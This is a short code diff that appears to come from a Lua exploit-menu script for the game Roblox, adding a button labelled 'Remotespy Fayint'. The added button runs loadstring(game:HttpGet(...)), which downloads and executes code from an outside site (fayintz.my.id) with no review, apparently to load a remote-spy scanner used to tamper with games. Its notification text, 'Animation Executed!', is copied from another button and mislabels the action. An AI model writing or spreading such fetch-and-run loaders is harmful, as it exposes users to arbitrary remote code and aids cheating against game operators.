@@ -318,6 +318,11 @@ AddScriptButton("Bring Coil", function()
     ShowNotification("Animation Executed!")
 end)
 
+AddScriptButton("Remotespy Fayint", function()
+    loadstring(game:HttpGet("https://fayintz.my.id/api/loader/Scanner-Remote"))()
+    ShowNotification("Animation Executed!")
+end)
+
 --- --- 🔹 ISI TAB AVATAR 🔹 --- ---
 local avatarTitle = Instance.new("TextLabel")
 avatarTitle.Parent = avatarTabFrame
